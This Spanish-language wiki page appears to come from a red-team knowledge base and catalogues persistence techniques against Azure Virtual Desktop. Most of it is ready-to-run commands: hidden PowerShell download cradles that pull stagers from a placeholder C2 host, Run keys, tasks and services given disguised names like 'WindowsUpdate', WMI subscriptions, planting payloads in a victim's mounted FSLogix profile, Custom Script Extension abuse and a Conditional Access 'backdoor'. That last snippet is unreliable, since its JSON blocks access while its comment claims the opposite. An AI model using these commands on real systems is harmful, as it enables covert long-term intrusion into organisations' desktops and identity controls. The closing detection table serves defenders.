---
tags: [cloud, azure, avd, persistence, fslogix]
status: wip
---

# AVD — Persistencia

> Técnicas de persistencia en entornos AVD: abuso de FSLogix profiles, startup scripts, scheduled tasks, extensions y configuración de host pools.

---

## Concepto

Los session hosts AVD pueden ser **persistent** (mantienen cambios) o **non-persistent/pooled** (se reconstruyen desde una imagen). La persistencia varía según el tipo:

| Tipo | ¿Persiste en el host? | ¿Persiste en el perfil? |
|------|----------------------|------------------------|
| Personal (persistent) | ✅ Sí | ✅ Sí |
| Pooled (non-persistent) | ❌ Se resetea | ✅ FSLogix persiste |

→ En entornos pooled, la persistencia se logra vía **FSLogix profiles** o componentes a nivel de imagen.

---

## FSLogix Profile Abuse

```powershell
# Los perfiles FSLogix son VHDs que se montan en cada login
# Contenido del VHD → se mapea a C:\Users\<username>\

# Si se puede escribir en el perfil → persistencia automática en cada login

# Opción 1: Startup script en el perfil
# Crear: %APPDATA%\Microsoft\Windows\Start Menu\Programs\Startup\payload.bat
echo powershell -ep bypass -w hidden -c "IEX(New-Object Net.WebClient).DownloadString('http://C2/stager')" > "%APPDATA%\Microsoft\Windows\Start Menu\Programs\Startup\update.bat"

# Opción 2: Registry Run key (persistido en el VHD)
reg add "HKCU\Software\Microsoft\Windows\CurrentVersion\Run" /v "WindowsUpdate" /t REG_SZ /d "powershell -ep bypass -w hidden -enc <B64_PAYLOAD>"

# Opción 3: Scheduled Task del usuario
schtasks /create /tn "OneDriveSync" /tr "powershell -ep bypass -w hidden -f C:\Users\%USERNAME%\AppData\sync.ps1" /sc onlogon /ru %USERNAME%
```

### Manipulación directa del VHD

```powershell
# Si se tiene acceso al share de FSLogix:
# 1. Montar el VHD de la víctima
Mount-DiskImage -ImagePath "\\storage.file.core.windows.net\profiles\S-1-5-..._user\Profile_user.vhdx"

# 2. Obtener la letra asignada
Get-Disk | Where-Object { $_.FriendlyName -like "*Virtual*" } | Get-Partition | Get-Volume

# 3. Escribir payload en la ubicación de persistencia
# ej: E:\Users\user\AppData\Roaming\Microsoft\Windows\Start Menu\Programs\Startup\

# 4. Desmontar
Dismount-DiskImage -ImagePath "\\storage.file.core.windows.net\profiles\S-1-5-..._user\Profile_user.vhdx"

# → La próxima vez que el usuario inicie sesión, se ejecuta el payload
```

---

## Persistencia en Session Hosts Persistent

```powershell
# En hosts persistent (personal desktops), técnicas clásicas de persistencia Windows:

# Scheduled Task como SYSTEM
schtasks /create /tn "AzureAgentUpdate" /tr "C:\Windows\Temp\payload.exe" /sc onstart /ru SYSTEM

# WMI Event Subscription
# Crear consumer + filter + binding (persiste en WMI repository)
$filter = Set-WmiInstance -Namespace root\subscription -Class __EventFilter -Arguments @{
    Name = "SecurityUpdate"
    EventNamespace = "root\cimv2"
    QueryLanguage = "WQL"
    Query = "SELECT * FROM __InstanceModificationEvent WITHIN 60 WHERE TargetInstance ISA 'Win32_PerfFormattedData_PerfOS_System'"
}

$consumer = Set-WmiInstance -Namespace root\subscription -Class CommandLineEventConsumer -Arguments @{
    Name = "SecurityUpdate"
    CommandLineTemplate = "powershell -ep bypass -w hidden -f C:\Windows\Temp\update.ps1"
}

Set-WmiInstance -Namespace root\subscription -Class __FilterToConsumerBinding -Arguments @{
    Filter = $filter
    Consumer = $consumer
}

# Service
sc.exe create "AzureMonitorAgent" binpath= "C:\Windows\Temp\svc.exe" start= auto
```

---

## Persistencia vía Azure (plano de control)

### Custom Script Extension

```powershell
# Si se tiene Contributor sobre la VM:
# Instalar Custom Script Extension → ejecuta scripts como SYSTEM

az vm extension set \
  --resource-group <RG> \
  --vm-name <SESSION_HOST> \
  --name CustomScriptExtension \
  --publisher Microsoft.Compute \
  --version 1.10 \
  --settings '{"commandToExecute":"powershell -ep bypass -c \"IEX(New-Object Net.WebClient).DownloadString('"'"'http://C2/payload'"'"')\""}' 

# La extensión se ejecuta una vez, pero se puede re-triggear
# Y persiste como recurso Azure asociado a la VM
```

### Run Command (persistente vía Automation)

```powershell
# Crear un Runbook en Azure Automation que ejecute código en la VM periódicamente

# O usar az vm run-command con --no-wait para lanzar payloads
az vm run-command invoke \
  --resource-group <RG> \
  --name <VM> \
  --command-id RunPowerShellScript \
  --scripts "schtasks /create /tn 'Persist' /tr 'C:\temp\beacon.exe' /sc onstart /ru SYSTEM"
```

### Imagen golden (host pool image)

```
# Si se compromete la imagen base del host pool:
# Inyectar payload en la imagen → cada nuevo session host deployado ejecuta el payload
# Targets:
# - Shared Image Gallery / Azure Compute Gallery
# - Managed Images
# - VHD base en Storage Account

# Verificar origen de la imagen:
az vm show --name <SESSION_HOST> --resource-group <RG> --query "storageProfile.imageReference"
```

---

## Backdoor en Conditional Access

```powershell
# Si se tiene Global Admin o Conditional Access Administrator:
# Crear una exclusión en la política CA que permita acceso sin MFA/compliance
# desde una IP controlada o para una cuenta de servicio

# Crear trusted location
az rest --method POST \
  --url "https://graph.microsoft.com/v1.0/identity/conditionalAccessPolicies" \
  --body '{
    "displayName": "AVD Service Account",
    "state": "enabled",
    "conditions": {
      "users": {"includeUsers": ["<SERVICE_ACCOUNT_ID>"]},
      "applications": {"includeApplications": ["All"]}
    },
    "grantControls": {
      "operator": "OR",
      "builtInControls": ["block"]
    }
  }'
# → Crear política que permita acceso a la cuenta de servicio sin restricciones
```

---

## OPSEC / Detección

| Acción | Log/Alerta |
|--------|------------|
| Startup folder payload | Sysmon Event 11 (File Create) en `\Startup\` |
| Registry Run key | Sysmon Event 13 (Registry modification) |
| Scheduled Task creation | Windows Security Event 4698 |
| WMI subscription | Sysmon Event 19/20/21 |
| Custom Script Extension | Azure Activity Log — `Microsoft.Compute/virtualMachines/extensions` |
| Conditional Access change | Entra ID Audit Log — `Update conditional access policy` |

---

## Ver también

- [[09-cloud/azure/azure-virtual-desktop|Azure Virtual Desktop]]
- [[09-cloud/azure/avd---session-host-attacks|AVD - Session Host Attacks]]
- [[09-cloud/azure/avd---lateral-movement|AVD - Lateral Movement]]

---

## Referencias

- [FSLogix Container Security — Microsoft](https://learn.microsoft.com/en-us/fslogix/configure-profile-container-tutorial)
- [Azure VM Extensions Abuse — NetSPI](https://www.netspi.com/blog/technical/cloud-penetration-testing/)
- [Persistence in Azure — HackTricks](https://book.hacktricks.xyz/pentesting-cloud/azure-security/az-persistence)
